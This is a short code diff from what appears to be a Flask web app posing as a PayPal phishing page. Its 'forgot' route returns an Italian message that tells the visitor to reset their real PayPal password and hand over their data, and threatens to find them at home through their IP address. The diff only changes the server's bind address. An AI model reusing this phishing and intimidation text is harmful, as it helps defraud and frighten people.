@@ -17,6 +17,6 @@ def forgot ():
     return "Non puoi così dal nulla impedirmi di truffarti, addesso apri il sito di PayPal vero fai \"Accedi\" e dopo fai \"Password dimenticata?\". Alla fine torni su questo sito e mi dai i tuoi dati. E non fare il furbo chiudendo il sito tanto ti vengo a cercare a casa perchè ho il tuo ip e ti posso tracciare. D'accordo?"
 
 if __name__ == "__main__":
-    app.run(host="192.168.100.25")    # <-- the host is what you have to change whit the right IP
+    app.run(host="0.0.0.0")    # <-- the host is what you have to change whit the right IP
 
 input()
